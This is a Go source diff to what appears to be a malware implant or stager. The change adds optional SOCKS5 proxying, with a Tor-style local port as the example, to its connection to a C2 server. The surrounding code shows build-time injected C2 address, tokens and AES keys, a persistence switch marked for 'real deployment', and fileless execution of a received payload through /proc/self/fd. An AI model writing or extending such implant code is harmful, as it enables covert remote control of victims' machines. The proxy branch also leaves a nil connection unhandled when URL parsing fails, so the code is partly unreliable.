@@ -1,3 +1,5 @@
+//go:build linux
+
 package main
 
 import (
@@ -5,12 +7,15 @@ import (
 	"crypto/cipher"
 	"fmt"
 	"net"
+	"net/url"
 	"os"
 	"strconv"
 	"strings"
 	"syscall"
 	"time"
 	"unsafe"
+
+	"golang.org/x/net/proxy"
 )
 
 // Overridden at build time via -ldflags -X
@@ -20,13 +25,30 @@ var (
 	implantToken  = ""   // if empty, uses authToken
 	aesKeyHex     = ""   // 32-byte hex key for AES-256-GCM; empty = no encryption
 	noPersist     = "true"  // pass --no-persist; set "false" for real deployment
+	proxyAddr     = ""   // SOCKS5 proxy (e.g., socks5://127.0.0.1:9050)
 )
 
 func main() {
-	// 1. Connect to C2 server
-	conn, err := net.DialTimeout("tcp", serverAddr, 15*time.Second)
-	if err != nil {
-		os.Exit(1)
+	// 1. Connect to C2 server (optionally through SOCKS5 proxy)
+	var conn net.Conn
+	var err error
+
+	if proxyAddr != "" {
+		proxyURL, parseErr := url.Parse(proxyAddr)
+		if parseErr == nil {
+			dialer, dialErr := proxy.FromURL(proxyURL, proxy.Direct)
+			if dialErr == nil {
+				conn, err = dialer.Dial("tcp", serverAddr)
+			}
+		}
+		if err != nil {
+			os.Exit(1)
+		}
+	} else {
+		conn, err = net.DialTimeout("tcp", serverAddr, 15*time.Second)
+		if err != nil {
+			os.Exit(1)
+		}
 	}
 	defer conn.Close()
 
@@ -94,6 +116,9 @@ func main() {
 	}
 	if noPersist == "true" {
 		args = append(args, "--no-persist")
+	}
+	if proxyAddr != "" {
+		args = append(args, "--proxy", proxyAddr)
 	}
 	syscall.Exec("/proc/self/fd/"+strconv.Itoa(fd), args, os.Environ())
 	os.Exit(11)
